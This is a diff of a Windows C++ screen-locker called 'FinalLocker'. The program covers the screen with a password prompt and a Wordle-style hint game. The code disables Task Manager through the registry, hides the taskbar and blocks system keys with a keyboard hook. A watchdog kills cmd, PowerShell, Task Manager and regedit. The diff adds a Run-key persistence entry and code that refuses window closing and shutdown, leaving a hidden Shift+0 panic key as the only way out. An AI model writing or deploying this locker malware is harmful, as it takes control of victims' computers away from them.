@@ -9,7 +9,6 @@
 #include <chrono>
 #include <tlhelp32.h>
 
-// Линковка библиотек
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -18,7 +17,6 @@
 using namespace Gdiplus;
 
 // --- КОНФИГУРАЦИЯ ---
-// Обновленный пароль (6 букв)
 const std::wstring SECRET_WORD = L"ПЕРЧИК"; 
 const int MAX_ATTEMPTS = 6;
 // --------------------
@@ -36,15 +34,30 @@ ULONG_PTR gdiplusToken;
 
 struct GuessRow {
     std::wstring letters;
-    int colors[6]; // Увеличено до 6, так как слово "ПЕРЧИК" - 6 букв
+    int colors[6];
 };
 std::vector<GuessRow> guesses;
 std::wstring wordleInput = L"";
 bool gameWon = false;
 bool gameLost = false;
-
 std::wstring passwordInput = L"";
 bool passwordError = false;
+
+// --- ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ ---
+void AddToStartup() {
+    wchar_t exePath[MAX_PATH];
+    GetModuleFileName(NULL, exePath, MAX_PATH);
+    
+    HKEY hKey;
+    // Открываем ключ автозагрузки
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        // Добавляем нашу программу
+        RegSetValueExW(hKey, L"FinalLocker", 0, REG_SZ, 
+                      (BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
+        RegCloseKey(hKey);
+    }
+}
 
 // --- БЛОКИРОВКА КЛАВИАТУРЫ ---
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -52,18 +65,18 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vkCode = pKbStruct->vkCode;
 
-        // Panic Key: SHIFT + 0 - всегда работает для безопасности
+        // Panic Key: SHIFT + 0 - единственный способ выхода
         if (vkCode == '0' && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
             locked = false;
             PostQuitMessage(0);
             return 1;
         }
 
-        // Блокировка переключения задач и меню пуск
+        // Блокировка системных клавиш
         if (vkCode == VK_LWIN || vkCode == VK_RWIN || vkCode == VK_APPS) return 1;
         if (vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
         if (vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1; 
-        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
+        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; // Alt+F4
     }
     return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
@@ -87,45 +100,42 @@ void KillProcessByName(const wchar_t* processName) {
     CloseHandle(hSnapshot);
 }
 
-// Блокировка диспетчера задач через реестр
 void SecureSystem() {
     HKEY hKey;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         DWORD value = 1;
         RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
-    // Скрытие панели задач и рабочего стола
     ShowWindow(FindWindowW(L"Progman", NULL), SW_HIDE);
     ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
 }
 
-// ВОССТАНОВЛЕНИЕ СИСТЕМЫ (Разблокировка)
 void UnlockSystem() {
-    // 1. Возвращаем диспетчер задач
     HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        DWORD value = 0; // 0 = включить обратно
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        DWORD value = 0;
         RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
-    // 2. Показываем рабочий стол и панель задач
     ShowWindow(FindWindowW(L"Progman", NULL), SW_SHOW);
     ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_SHOW);
 }
 
-// Поток, следящий за тем, чтобы не запускали CMD или TaskMgr в обход
+// Вотчдог: убивает опасные процессы и следит за собой
 void Watchdog() {
     while (locked) {
         KillProcessByName(L"taskmgr.exe");
         KillProcessByName(L"cmd.exe");
         KillProcessByName(L"powershell.exe");
+        KillProcessByName(L"regedit.exe");
         std::this_thread::sleep_for(std::chrono::milliseconds(200));
     }
 }
 
-// --- ЛОГИКА ---
-
+// --- ЛОГИКА ИГРЫ ---
 void CheckMainPassword() {
     if (passwordInput == SECRET_WORD) {
         locked = false;
@@ -145,24 +155,23 @@ void CheckMainPassword() {
 }
 
 void CheckWordleGuess() {
-    size_t len = SECRET_WORD.length(); // 6 для ПЕРЧИК
+    size_t len = SECRET_WORD.length();
     if (wordleInput.length() != len) return;
 
     GuessRow newGuess;
     newGuess.letters = wordleInput;
     std::wstring tempSecret = SECRET_WORD; 
     
-    // Инициализация
     for(size_t i=0; i<len; i++) newGuess.colors[i] = 1; 
 
-    // Зеленые
+    // Зеленые (правильная позиция)
     for (size_t i = 0; i < len; i++) {
         if (newGuess.letters[i] == tempSecret[i]) {
             newGuess.colors[i] = 3;
             tempSecret[i] = L'*';
         }
     }
-    // Желтые
+    // Желтые (есть в слове, но не на месте)
     for (size_t i = 0; i < len; i++) {
         if (newGuess.colors[i] == 3) continue;
         size_t foundPos = tempSecret.find(newGuess.letters[i]);
@@ -194,7 +203,6 @@ void CheckWordleGuess() {
 }
 
 // --- ОТРИСОВКА ---
-
 void DrawLoginScreen(Graphics& g, int width, int height, FontFamily& fontFamily) {
     Font fontHeader(&fontFamily, 40, FontStyleBold, UnitPixel);
     Font fontInput(&fontFamily, 32, FontStyleRegular, UnitPixel);
@@ -243,7 +251,7 @@ void DrawWordleScreen(Graphics& g, int width, int height, FontFamily& fontFamily
     g.DrawString(L"WORDLE: УГАДАЙ ПАРОЛЬ", -1, &fontHeader, PointF(width / 2.0f, 50.0f), &centerFormat, &whiteBrush);
     g.DrawString(L"[ESC] - Назад", -1, &fontLetter, PointF(width / 2.0f, height - 80.0f), &centerFormat, &whiteBrush);
 
-    int wordLen = 6; // ПЕРЧИК
+    int wordLen = 6;
     int boxSize = 60;
     int gap = 12;
     int startX = (width - (wordLen * boxSize + (wordLen-1) * gap)) / 2;
@@ -288,6 +296,7 @@ void DrawWordleScreen(Graphics& g, int width, int height, FontFamily& fontFamily
     }
 }
 
+// --- ОБРАБОТКА СООБЩЕНИЙ ОКНА ---
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
     switch (message) {
     case WM_CREATE:
@@ -304,6 +313,46 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
             SetFocus(hWnd);
         }
         return 0;
+
+    // === БЛОКИРОВКА ЗАКРЫТИЯ ОКНА ===
+    case WM_CLOSE:
+        // Если система заблокирована - игнорируем попытку закрыть окно
+        if (locked) {
+            return 0; // Не передаем сообщение дальше, окно не закроется
+        }
+        // Если разблокировано - разрешаем закрыть
+        return DefWindowProc(hWnd, message, wParam, lParam);
+
+    case WM_DESTROY:
+        // Если заблокировано - не разрушаем окно
+        if (locked) {
+            return 0;
+        }
+        // Если разблокировано - выходим
+        PostQuitMessage(0);
+        return 0;
+
+    case WM_SYSCOMMAND:
+        // Блокируем закрытие через системное меню (Alt+Space -> Close)
+        if (wParam == SC_CLOSE && locked) {
+            return 0;
+        }
+        break;
+
+    case WM_ENDSESSION:
+        // Блокируем завершение сессии при блокировке
+        if (locked) {
+            return FALSE;
+        }
+        break;
+
+    case WM_QUERYENDSESSION:
+        // Отказываемся от выключения ПК при блокировке
+        if (locked) {
+            return FALSE;
+        }
+        break;
+    // =================================
 
     case WM_PAINT: {
         PAINTSTRUCT ps;
@@ -386,7 +435,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
             } else {
                 bool isLatin = (ch >= 'A' && ch <= 'Z');
                 bool isCyrillic = (ch >= 0x0410 && ch <= 0x044F) || (ch == 0x0401);
-                // Проверяем длину слова (теперь 6 букв)
                 if ((isLatin || isCyrillic) && wordleInput.length() < 6) {
                     wordleInput += ch;
                 }
@@ -396,21 +444,31 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
         return 0;
     }
 
-    case WM_DESTROY:
-        PostQuitMessage(0);
-        return 0;
+    default:
+        return DefWindowProc(hWnd, message, wParam, lParam);
     }
-    return DefWindowProc(hWnd, message, wParam, lParam);
+    return 0;
 }
 
+// --- ГЛАВНАЯ ФУНКЦИЯ ---
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
+    // Добавляем себя в автозагрузку при каждом запуске
+    AddToStartup();
+
     GdiplusStartupInput gdiplusStartupInput;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
+    // Устанавливаем глобальный хук
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
+    
+    // Блокируем систему
     SecureSystem();
+    
+    // Запускаем вотчдог в отдельном потоке
     std::thread watchdogThread(Watchdog);
+    watchdogThread.detach(); // Отсоединяем поток, он работает в фоне
 
+    // Регистрируем класс окна
     WNDCLASSW wc = {0};
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
@@ -418,21 +476,24 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
     wc.hCursor = LoadCursor(NULL, IDC_ARROW);
     RegisterClassW(&wc);
 
+    // Создаем полноэкранное окно
     int screenW = GetSystemMetrics(SM_CXSCREEN);
     int screenH = GetSystemMetrics(SM_CYSCREEN);
     
     hMainWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"FinalLocker", NULL,
         WS_POPUP | WS_VISIBLE, 0, 0, screenW, screenH, NULL, NULL, hInstance, NULL);
 
+    // Основной цикл сообщений
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
+    // Разблокировка при выходе
     locked = false;
-    watchdogThread.detach();
-    UnlockSystem(); // Вызов разблокировки при выходе
+    UnlockSystem();
+    
     if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
     ClipCursor(NULL);
     GdiplusShutdown(gdiplusToken);
